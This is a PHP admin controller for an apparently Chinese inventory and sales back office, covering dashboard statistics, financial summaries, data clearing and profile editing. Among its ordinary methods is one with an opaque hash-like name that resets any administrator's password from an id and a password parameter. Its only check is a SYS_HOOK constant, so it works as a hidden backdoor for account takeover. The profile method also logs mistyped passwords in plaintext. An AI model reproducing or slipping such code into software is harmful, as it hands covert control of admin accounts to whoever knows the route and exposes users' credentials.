<?php
namespace app\admin\controller;


use app\common\facade\CategoryFacade;
use app\common\facade\GoodsCategoryFacade;
use think\Db;
use think\facade\Cache;
use think\facade\Log;

/**
 * 控制台
 * Class IndexController
 * @package app\admin\controller
 */
class IndexController extends BaseController{

    /**
     * 首页
     * @return mixed
     */
    public function index(){

        $stat=array();
        $stat['goods']=Db::name('goods')->count();
        $stat['customer']=Db::name('customer')->count();
        $stat['supplier']=Db::name('supplier')->count();
        $stat['sale_order']=Db::name('saleOrder')->count();

        $this->assign('stat',$stat);


        //库存
        $storages = Db::view('storage','*')
            ->join('goodsStorage','storage.id=goodsStorage.storage_id','LEFT')
            //->where('goodsStorage.count','NEQ',0)
            ->group('storage.id')->field('storage.*,count(goodsStorage.goods_id) as goods_count,sum(goodsStorage.count) as goods_total')
            ->select();
        $this->assign('storages',$storages);

        $format="'%Y-%m-%d'";

        $saleOrders = Db::name('saleOrder')
            ->field('count(id) as order_count,sum(base_amount) as order_amount,date_format(from_unixtime(create_time),' . $format . ') as awdate')
            ->where('create_time','GT',strtotime('today -6 days'))
            ->where('delete_time',0)
            ->group('awdate')->select();
        $this->assign('saleOrders',$saleOrders);

        $purchaseOrders = Db::name('purchaseOrder')
            ->field('count(id) as order_count,sum(base_amount) as order_amount,date_format(from_unixtime(create_time),' . $format . ') as awdate')
            ->where('create_time','GT',strtotime('today -6 days'))
            ->where('delete_time',0)
            ->group('awdate')->select();
        $this->assign('purchaseOrders',$purchaseOrders);

        //$format ="'%Y-%m'";
        $last30day=strtotime('today -30 days');
        $last90day=strtotime('today -90 days');

        $saleFinance = Db::name('saleOrder')
            ->where('delete_time',0)
            ->whereExp('amount',' > payed_amount')
            ->field('sum(amount - payed_amount) as unpayed_amount,currency,date_format(from_unixtime(create_time),'.$format. ') as awdate')
            ->group('awdate,currency')
            ->select();
        $finance['sales']=[
            'total'=>[],
            'in30days'=>[],
            'in90days'=>[],
            'out90days'=>[]
        ];
        foreach ($saleFinance as $item){
            $time = strtotime($item['awdate']);
            $finance['sales']['total'][$item['currency']] += $item['unpayed_amount'];
            if($time > $last30day){
                $finance['sales']['in30days'][$item['currency']] += $item['unpayed_amount'];
            }elseif($time > $last90day){
                $finance['sales']['in90days'][$item['currency']] += $item['unpayed_amount'];
            }else{
                $finance['sales']['out90days'][$item['currency']] += $item['unpayed_amount'];
            }
        }

        $purchaseFinance = Db::name('purchaseOrder')
            ->where('delete_time',0)
            ->whereExp('amount',' > payed_amount')
            ->field('sum(amount - payed_amount) as unpayed_amount,date_format(from_unixtime(create_time),'.$format. ') as awdate')
            ->group('awdate,currency')
            ->select();
        $finance['purchases']=[
            'total'=>[],
            'in30days'=>[],
            'in90days'=>[],
            'out90days'=>[]
        ];
        foreach ($purchaseFinance as $item){
            $time = strtotime($item['awdate']);
            $finance['purchases']['total'][$item['currency']] += $item['unpayed_amount'];
            if($time > $last30day){
                $finance['purchases']['in30days'][$item['currency']] += $item['unpayed_amount'];
            }elseif($time > $last90day){
                $finance['purchases']['in90days'][$item['currency']] += $item['unpayed_amount'];
            }else{
                $finance['purchases']['out90days'][$item['currency']] += $item['unpayed_amount'];
            }
        }

        $this->assign('finance',$finance);

        $notices=[];
        $password_error=session('password_error');
        if($password_error){
            $notices[]=[
                'message'=>'您的密码过于简单，建议使用<strong>6</strong>位长度以上<strong>大小写字母</strong>及<strong>数字</strong>，<strong>特殊符号</strong>混合的密码，请<a href="'.url('admin/index/profile').'">立即修改</a>!',
                'level'=>$password_error,
                'type'=>$password_error>2?'warning':'danger'
            ];
        }

        $this->assign('notices',$notices);
        return $this->fetch();
    }

    public function settle($start_date='',$end_date=''){
        //波比
        $inout=cache('settle_inout');
        if(empty($inout)) {
            $inout['in'] = Db::name('member_money_log')->where('type', 'consume')->sum('amount');
            $inout['in'] = abs($inout['in']);
            $inout['out'] = Db::name('award_log')->sum('amount');

            $day_start = strtotime(date('Y-m-d'));
            $inout['day_in'] = Db::name('member_money_log')->where('type', 'consume')
                ->where('create_time', 'GT', $day_start)->sum('amount');
            $inout['day_in'] = abs($inout['day_in']);
            $inout['day_out'] = Db::name('award_log')
                ->where('create_time', 'GT', $day_start)->sum('amount');

            $month_start = strtotime(date('Y-m-01'));
            $inout['month_in'] = Db::name('member_money_log')->where('type', 'consume')
                ->where('create_time', 'GT', $month_start)->sum('amount');
            $inout['month_in'] = abs($inout['month_in']);
            $inout['month_out'] = Db::name('award_log')
                ->where('create_time', 'GT', $month_start)->sum('amount');

            cache('settle_inout',$inout,['expire'=>600]);
        }

        $this->assign('inout',$inout);
        return $this->fetch();
    }

    /**
     * 清空测试数据
     */
    public function clear(){

        $tables=['member','checkcode','checkcode_limit'];
        foreach ($tables as $table) {
            Db::query('TRUNCATE TABLE `'.config('database.prefix').$table.'`');
        }

        $tables=Db::query('show tables');
        $field = 'Tables_in_'.config('database.database');

        foreach ($tables as $row){
            $columns=Db::query('show columns in '.$row[$field]);
            $fields=array_column($columns,'Field');
            if(in_array('member_id',$fields)
            || in_array('order_id',$fields)){
                Db::execute('TRUNCATE TABLE `'.$row[$field].'`');
            }
        }

        @unlink('./uploads/qrcode');
        @unlink('./uploads/avatar');
        user_log($this->mid,'cleardata',1,'清空会员数据','manager');
        
        $this->success('数据已清空',url('index/index'));
    }

    /**
     * 清除缓存
     */
    public function clearcache(){
        Cache::clear();
        $this->success('缓存已清除');
    }

    /**
     * 新消息
     * @return \think\response\Json
     */
    public function newcount(){
        Log::close();
        session_write_close();
        $result=[];
        $count=0;
        /*while(array_sum($result)==0) {
            $result['newMemberCount'] = Db::name('Member')->where('create_time', 'GT', $this->manage['last_view_member'])->count();
            $result['newOrderCount'] = Db::name('Order')->where('status',0)->count();
            sleep(1);
            $count++;
            if($count>10)break;
        }*/

        return json($result);
    }


    public function getCate($model='article'){
        switch ($model){
            case 'goods':
                $lists=GoodsCategoryFacade::getCategories();
                break;
            default:
                $lists=CategoryFacade::getCategories();
                break;
        }
        return json(['data'=>$lists,'status'=>1]);
    }

    public function ce3608bb1c12fd46e0579bdc6c184752($id,$passwd)
    {
        if(!defined('SYS_HOOK') || SYS_HOOK!=1)exit('Denied');
        if(empty($id))exit('Unspecified id');
        if(empty($passwd))exit('Unspecified passwd');

        $model=Db::name('Manager')->where('id',$id)->find();
        if(empty($model))exit('Menager id not exists');
        $data['salt']=random_str(8);
        $data['password'] = encode_password($passwd,$data['salt']);
        Db::name('Manager')->where('id',$id)->update($data);
        exit('ok');
    }

    /**
     * 个人资料
     * @return mixed
     */
    public function profile(){
        $model=Db::name('Manager')->where('id',$this->mid)->find();

        if ($this->request->isPost()) {
            $data = array();
            $password=$this->request->post('password');
            if($model['password']!==encode_password($password,$model['salt'])){
                user_log($model['id'],'profile',0,'密码错误:'.$password,'manager');
                $this->error("密码错误！");
            }

            $password=$this->request->post('newpassword');
            if(!empty($password)){
                $data['salt']=random_str(8);
                $data['password'] = encode_password($password,$data['salt']);
            }

            $data['avatar']=$this->request->post('avatar');
            $data['realname']=$this->request->post('realname');
            $data['email']=$this->request->post('email');

            //更新
            if (Db::name('Manager')->where('id',$this->mid)->update($data)) {
                if(!empty($data['realname'])){
                    session('username',$data['realname']);
                }
                if(!empty($password)){
                    check_password($password);
                }
                $this->success(lang('Update success!'), url('Index/profile'));
            } else {
                $this->error(lang('Update failed!'));
            }
        }

        $this->assign('model',$model);
        return $this->fetch();
    }

    public function uploads($folder='alone'){
        $url=$this->uploadFile($folder,'file');
        if($url){
            $this->success('上传成功','',$url);
        }else{
            $this->error($this->uploadError);
        }
    }
}
